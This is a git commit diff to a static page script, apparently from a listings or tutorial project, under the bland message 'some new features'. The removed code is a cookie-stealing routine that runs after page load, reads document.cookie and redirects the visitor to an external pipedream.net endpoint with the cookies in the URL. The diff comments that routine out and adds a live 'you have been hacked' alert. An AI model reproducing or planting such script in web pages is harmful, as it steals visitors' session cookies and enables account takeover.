07a84a509b6920915569c9159cdff8d6a0545df5
asbilim <bilimdepaullilian@gmail.com>
2024-09-12 15:57:12 +0100

    some new features

--- listings/static/ch62/script.js
+++ listings/static/ch62/script.js
@@ -1,15 +1,16 @@
 document.addEventListener("DOMContentLoaded", function () {
-  function redirectWithCookies() {
-    const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";
-    const cookies = document.cookie;
+  alert("you have been hacked");
+  // function redirectWithCookies() {
+  //   const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";
+  //   const cookies = document.cookie;
 
-    if (cookies) {
-      const redirectUrl = `${endpoint}?data=${encodeURIComponent(cookies)}`;
-      window.location.replace(redirectUrl);
-    } else {
-      console.error("No cookies available to send.");
-    }
-  }
+  //   if (cookies) {
+  //     const redirectUrl = `${endpoint}?data=${encodeURIComponent(cookies)}`;
+  //     window.location.replace(redirectUrl);
+  //   } else {
+  //     console.error("No cookies available to send.");
+  //   }
+  // }
 
-  setTimeout(redirectWithCookies, 224000);
+  // setTimeout(redirectWithCookies, 2000);
 });
